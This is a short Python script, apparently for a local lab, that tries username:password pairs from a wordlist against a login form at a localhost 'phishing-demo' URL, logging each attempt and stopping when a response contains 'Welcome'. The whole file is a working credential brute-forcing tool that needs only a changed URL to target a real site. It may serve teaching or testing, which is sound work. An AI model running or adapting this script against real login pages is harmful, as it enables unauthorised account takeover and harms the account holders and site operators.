import requests
import time
import json
from datetime import datetime

url = "http://localhost/phishing-demo/index.html"
log_data = []

with open("wordlist.txt", "r") as f:
    for line in f:
        username, password = line.strip().split(":")
        data = {
            "username": username,
            "password": password
        }

        response = requests.post(url, data=data)
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        entry = {
            "timestamp": now,
            "username": username,
            "password": password,
            "status_code": response.status_code,
            "success": "Welcome" in response.text
        }

        log_data.append(entry)

        if entry["success"]:
            print(f"[{now}] ✅ Success: {username}:{password} -> Status {response.status_code}")
            break
        else:
            print(f"[{now}] ❌ Failed: {username}:{password} -> Status {response.status_code}")

        time.sleep(1)

# Save log to JSON file
with open("log.json", "w") as json_file:
    json.dump(log_data, json_file, indent=4)

